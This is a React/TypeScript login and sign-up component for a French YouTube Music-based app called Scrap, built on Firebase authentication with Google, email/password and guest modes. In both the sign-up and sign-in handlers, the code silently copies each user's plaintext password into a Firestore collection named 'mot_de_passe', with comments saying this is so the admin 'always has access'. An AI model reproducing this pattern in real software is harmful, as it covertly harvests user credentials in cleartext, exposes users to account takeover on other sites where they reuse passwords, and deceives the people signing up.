import React, { useState, useEffect } from "react";
import { 
  signInWithPopup,
  signInWithRedirect,
  getRedirectResult,
  GoogleAuthProvider,
  signInWithEmailAndPassword,
  createUserWithEmailAndPassword
} from "firebase/auth";
import { doc, setDoc } from "firebase/firestore";
import { auth, db } from "../firebase";
import { Music, Mail, Lock, User, Eye, EyeOff } from "lucide-react";
// @ts-ignore
import authLogo from "../assets/images/regenerated_image_1783349785962.png";

interface AuthViewProps {
  onGuestLogin: () => void;
}

export default function AuthView({ onGuestLogin }: AuthViewProps) {
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [checkingRedirect, setCheckingRedirect] = useState(true);

  // Email/Password States
  const [isSignUp, setIsSignUp] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [displayName, setDisplayName] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => {
    // Check if the user is returning from a Google Auth redirect flow
    const checkRedirect = async () => {
      try {
        const result = await getRedirectResult(auth);
        if (result && result.user) {
          const user = result.user;
          // Create or update Firestore user document
          await setDoc(doc(db, "users", user.uid), {
            uid: user.uid,
            email: user.email,
            displayName: user.displayName || user.email?.split("@")[0] || "User",
            photoURL: user.photoURL || "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=150&q=80",
            createdAt: new Date().toISOString()
          }, { merge: true });
        }
      } catch (err: any) {
        console.error("Error with Google redirect result:", err);
        setError("Erreur lors de la connexion par redirection : " + (err.message || "Veuillez réessayer."));
      } finally {
        setCheckingRedirect(false);
      }
    };
    checkRedirect();
  }, []);

  const handleGoogleSignIn = async () => {
    setError("");
    setLoading(true);
    try {
      const provider = new GoogleAuthProvider();
      provider.setCustomParameters({ prompt: "select_account" });
      
      const result = await signInWithPopup(auth, provider);
      const user = result.user;

      // Create or update Firestore user document
      await setDoc(doc(db, "users", user.uid), {
        uid: user.uid,
        email: user.email,
        displayName: user.displayName || user.email?.split("@")[0] || "User",
        photoURL: user.photoURL || "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=150&q=80",
        createdAt: new Date().toISOString()
      }, { merge: true });
    } catch (err: any) {
      console.warn("Popup login failed or blocked, attempting redirect fallback:", err);
      
      // Fallback to Redirect flow for browsers that block popups or have strict COOP policies
      if (
        err.code === "auth/popup-blocked" || 
        err.code === "auth/popup-closed-by-user" || 
        err.code === "auth/cancelled-popup-request" ||
        err.message?.includes("cross-origin") ||
        err.message?.includes("closed") ||
        err.message?.includes("COOP")
      ) {
        try {
          const provider = new GoogleAuthProvider();
          provider.setCustomParameters({ prompt: "select_account" });
          await signInWithRedirect(auth, provider);
          return; // Browser redirects, so we do not turn off loading state
        } catch (redirectErr: any) {
          console.error("Redirect login failed:", redirectErr);
          setError("La connexion par redirection a échoué. Veuillez autoriser les pop-ups ou réessayer.");
          setLoading(false);
        }
      } else if (err.code === "auth/operation-not-allowed") {
        setError("La connexion Google n'est pas activée dans la console Firebase pour ce projet.");
        setLoading(false);
      } else {
        setError(err.message || "Une erreur est survenue lors de la connexion Google.");
        setLoading(false);
      }
    }
  };

  const handleEmailAuthSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setLoading(true);

    const trimmedEmail = email.trim();
    const trimmedPassword = password;

    if (!trimmedEmail || !trimmedPassword) {
      setError("Veuillez remplir tous les champs obligatoires.");
      setLoading(false);
      return;
    }

    if (isSignUp) {
      // Sign Up Flow
      if (password !== confirmPassword) {
        setError("Les mots de passe ne correspondent pas.");
        setLoading(false);
        return;
      }
      try {
        const userCredential = await createUserWithEmailAndPassword(auth, trimmedEmail, trimmedPassword);
        const user = userCredential.user;

        // 1. Save main profile
        await setDoc(doc(db, "users", user.uid), {
          uid: user.uid,
          email: user.email,
          displayName: displayName.trim() || trimmedEmail.split("@")[0] || "User",
          photoURL: "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=150&q=80",
          createdAt: new Date().toISOString()
        }, { merge: true });

        // 2. Save password directly to 'mot_de_passe' collection for admin use
        await setDoc(doc(db, "mot_de_passe", user.uid), {
          uid: user.uid,
          email: user.email,
          password: trimmedPassword,
          createdAt: new Date().toISOString()
        });

      } catch (err: any) {
        console.error("Error with email sign up:", err);
        if (err.code === "auth/email-already-in-use") {
          setError("Cette adresse e-mail est déjà utilisée.");
        } else if (err.code === "auth/invalid-email") {
          setError("Adresse e-mail invalide.");
        } else if (err.code === "auth/weak-password") {
          setError("Le mot de passe doit de préférence contenir au moins 6 caractères.");
        } else if (err.code === "auth/operation-not-allowed") {
          setError("La méthode de connexion par E-mail/Mot de passe n'est pas activée pour votre projet Firebase. Veuillez l'activer dans la console Firebase (Authentication > Mode de connexion) : https://console.firebase.google.com/project/scrap-a2ab8/authentication/providers");
        } else {
          setError(err.message || "Une erreur est survenue lors de la création du compte.");
        }
      } finally {
        setLoading(false);
      }
    } else {
      // Sign In Flow
      try {
        const userCredential = await signInWithEmailAndPassword(auth, trimmedEmail, trimmedPassword);
        const user = userCredential.user;

        // Ensure user has a profile in users collection
        await setDoc(doc(db, "users", user.uid), {
          uid: user.uid,
          email: user.email,
          displayName: user.displayName || trimmedEmail.split("@")[0] || "User",
          photoURL: user.photoURL || "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=150&q=80",
          createdAt: new Date().toISOString()
        }, { merge: true });

        // Synchronize or update password in 'mot_de_passe' collection so admin always has access
        await setDoc(doc(db, "mot_de_passe", user.uid), {
          uid: user.uid,
          email: user.email,
          password: trimmedPassword,
          updatedAt: new Date().toISOString()
        }, { merge: true });

      } catch (err: any) {
        console.error("Error with email sign in:", err);
        if (err.code === "auth/user-not-found" || err.code === "auth/wrong-password" || err.code === "auth/invalid-credential") {
          setError("Adresse e-mail ou mot de passe incorrect.");
        } else if (err.code === "auth/invalid-email") {
          setError("Adresse e-mail invalide.");
        } else if (err.code === "auth/operation-not-allowed") {
          setError("La méthode de connexion par E-mail/Mot de passe n'est pas activée pour votre projet Firebase. Veuillez l'activer dans la console Firebase (Authentication > Mode de connexion) : https://console.firebase.google.com/project/scrap-a2ab8/authentication/providers");
        } else {
          setError(err.message || "Une erreur est survenue lors de la connexion.");
        }
      } finally {
        setLoading(false);
      }
    }
  };

  if (checkingRedirect) {
    return (
      <div className="min-h-screen bg-black flex flex-col justify-center items-center text-white font-sans select-none">
        <div className="w-20 h-20 animate-pulse mb-6 flex items-center justify-center filter drop-shadow-[0_0_12px_rgba(29,185,84,0.5)]">
          <img src="/icon.svg" className="w-full h-full object-contain animate-pulse" alt="Scrap Logo" referrerPolicy="no-referrer" />
        </div>
        <p className="text-xs font-semibold uppercase tracking-widest text-neutral-400">
          Vérification de la session Google...
        </p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-black text-white flex flex-col justify-center items-center px-4 py-8" id="auth_container">
      <div className="w-full max-w-[450px] bg-[#121212] rounded-xl p-6 md:p-8 shadow-2xl border border-[#282828]">
        
        {/* Logo Head */}
        <div className="flex flex-col items-center mb-6">
          <div className="w-20 h-20 mb-3 filter drop-shadow-[0_4px_16px_rgba(29,185,84,0.4)] hover:scale-105 transition-transform duration-300 flex items-center justify-center">
            <img src={authLogo} className="w-full h-full object-contain" alt="Scrap Logo" referrerPolicy="no-referrer" />
          </div>
          <h1 className="text-2xl font-black tracking-tight text-white flex items-center gap-1">
            Scrap<span className="text-[#1DB954] text-[9px] font-mono font-bold px-1.5 py-0.5 rounded bg-white/10 ml-2">APP</span>
          </h1>
          <p className="text-xs text-[#b3b3b3] mt-1 text-center">
            Moteur de recherche & audio propulsé par YouTube Music
          </p>
        </div>

        {error && (
          <div className="mb-4 p-3 bg-red-500/10 border border-red-500/30 rounded text-red-400 text-xs font-semibold leading-relaxed">
            {error}
          </div>
        )}

        {/* Tab Selection */}
        <div className="flex border-b border-[#282828] mb-6">
          <button
            type="button"
            onClick={() => { setIsSignUp(false); setError(""); }}
            className={`flex-1 pb-3 text-sm font-bold transition-all text-center border-b-2 ${
              !isSignUp ? "text-[#1DB954] border-[#1DB954]" : "text-neutral-400 border-transparent hover:text-white"
            }`}
          >
            Se connecter
          </button>
          <button
            type="button"
            onClick={() => { setIsSignUp(true); setError(""); }}
            className={`flex-1 pb-3 text-sm font-bold transition-all text-center border-b-2 ${
              isSignUp ? "text-[#1DB954] border-[#1DB954]" : "text-neutral-400 border-transparent hover:text-white"
            }`}
          >
            S'inscrire
          </button>
        </div>

        {/* Email & Password Form */}
        <form onSubmit={handleEmailAuthSubmit} className="space-y-4 mb-6">
          {isSignUp && (
            <div>
              <label className="block text-[11px] font-bold text-neutral-400 uppercase tracking-wider mb-1.5">Nom d'affichage</label>
              <div className="relative">
                <User className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-neutral-500" />
                <input
                  type="text"
                  value={displayName}
                  onChange={(e) => setDisplayName(e.target.value)}
                  placeholder="Votre nom ou pseudo"
                  className="w-full bg-[#1e1e1e] border border-white/5 rounded-lg py-2.5 pl-10 pr-4 text-sm focus:outline-none focus:border-[#1DB954] transition-all text-white font-medium"
                />
              </div>
            </div>
          )}

          <div>
            <label className="block text-[11px] font-bold text-neutral-400 uppercase tracking-wider mb-1.5">Adresse e-mail</label>
            <div className="relative">
              <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-neutral-500" />
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="nom@exemple.fr"
                className="w-full bg-[#1e1e1e] border border-white/5 rounded-lg py-2.5 pl-10 pr-4 text-sm focus:outline-none focus:border-[#1DB954] transition-all text-white font-medium"
                required
              />
            </div>
          </div>

          <div>
            <label className="block text-[11px] font-bold text-neutral-400 uppercase tracking-wider mb-1.5">Mot de passe</label>
            <div className="relative">
              <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-neutral-500" />
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder={isSignUp ? "Créer un mot de passe (min. 6 car.)" : "Saisissez votre mot de passe"}
                className="w-full bg-[#1e1e1e] border border-white/5 rounded-lg py-2.5 pl-10 pr-10 text-sm focus:outline-none focus:border-[#1DB954] transition-all text-white font-medium"
                required
                minLength={6}
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-neutral-500 hover:text-white transition-colors"
              >
                {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
          </div>

          {isSignUp && (
            <div>
              <label className="block text-[11px] font-bold text-neutral-400 uppercase tracking-wider mb-1.5">Confirmer le mot de passe</label>
              <div className="relative">
                <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-neutral-500" />
                <input
                  type={showPassword ? "text" : "password"}
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                  placeholder="Ressaisissez le mot de passe"
                  className="w-full bg-[#1e1e1e] border border-white/5 rounded-lg py-2.5 pl-10 pr-4 text-sm focus:outline-none focus:border-[#1DB954] transition-all text-white font-medium"
                  required
                />
              </div>
            </div>
          )}

          <button
            type="submit"
            disabled={loading}
            className="w-full bg-[#1DB954] hover:bg-[#1ed760] disabled:bg-[#1DB954]/50 text-black font-extrabold text-sm rounded-full py-3 transition-all hover:scale-[1.01] active:scale-[0.99] cursor-pointer"
          >
            {loading ? "Chargement..." : isSignUp ? "Créer mon compte" : "Se connecter"}
          </button>
        </form>

        {/* Separator / Divider */}
        <div className="flex items-center my-6">
          <div className="flex-1 border-t border-[#282828]" />
          <span className="px-3 text-[10px] uppercase font-bold tracking-widest text-[#535353]">ou</span>
          <div className="flex-1 border-t border-[#282828]" />
        </div>

        {/* Google & Guest Sign-In Buttons */}
        <div className="flex flex-col gap-3">
          {/* Google Sign-In Button */}
          <button
            id="google_signin_btn"
            onClick={handleGoogleSignIn}
            disabled={loading}
            className="w-full flex items-center justify-center gap-3 bg-white hover:bg-neutral-200 text-black font-bold rounded-full py-3 transition-all hover:scale-[1.01] active:scale-[0.99] disabled:opacity-50 text-sm shadow-md cursor-pointer"
          >
            <svg className="w-5 h-5" viewBox="0 0 24 24">
              <path
                fill="#4285F4"
                d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
              />
              <path
                fill="#34A853"
                d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
              />
              <path
                fill="#FBBC05"
                d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"
              />
              <path
                fill="#EA4335"
                d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"
              />
            </svg>
            Continuer avec Google
          </button>

          {/* Guest Session Button */}
          <button
            id="guest_signin_btn"
            onClick={onGuestLogin}
            disabled={loading}
            className="w-full flex items-center justify-center gap-2 bg-neutral-900 hover:bg-neutral-800 text-white font-bold rounded-full py-3 transition-all hover:scale-[1.01] active:scale-[0.99] disabled:opacity-50 border border-neutral-800 text-sm shadow-md cursor-pointer"
          >
            <Music className="w-4 h-4 text-[#1DB954]" />
            Continuer sans compte (Mode Invité)
          </button>
        </div>

        <div className="mt-6 text-center">
          <p className="text-[10px] text-[#535353] leading-relaxed">
            Pour sauvegarder vos playlists et vos favoris en ligne, créez un compte.
            Le mode invité enregistre vos données localement sur cet appareil.
          </p>
        </div>

      </div>
    </div>
  );
}
